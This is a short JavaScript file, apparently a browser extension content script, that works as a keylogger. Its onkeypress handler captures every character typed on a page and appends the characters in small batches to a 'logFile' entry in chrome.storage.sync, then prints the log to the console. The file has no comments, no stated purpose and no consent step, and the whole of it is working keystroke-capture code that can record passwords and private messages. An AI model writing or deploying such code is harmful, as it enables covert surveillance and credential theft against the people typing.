var stringToWrite = "";

function writeStringToStorage(s) {
	
	chrome.storage.sync.get("logFile", function(items) {
	    if (!chrome.runtime.error) {
				var oldString;
				
				if (items.logFile)
					oldString = items.logFile;
				else
					oldString = "";
				
				var newString = oldString + s;
				chrome.storage.sync.set({"logFile": newString});
	    }
	  });
		
	chrome.storage.sync.get("logFile", function(items) {
	    if (!chrome.runtime.error) {
	      console.log(items.logFile);
	    }
	  });
	
}

document.onkeypress = function(evt) {
	
	// Get the key
	evt = evt || window.event;
	var charCode = evt.keyCode || evt.which;
	var charStr = String.fromCharCode(charCode);
	
	// Prepare to write
	stringToWrite += charStr;
	
	// Write to chrome.storage
	if (stringToWrite.length >= 3) {
		writeStringToStorage(stringToWrite);
		stringToWrite = "";
	}
	
}
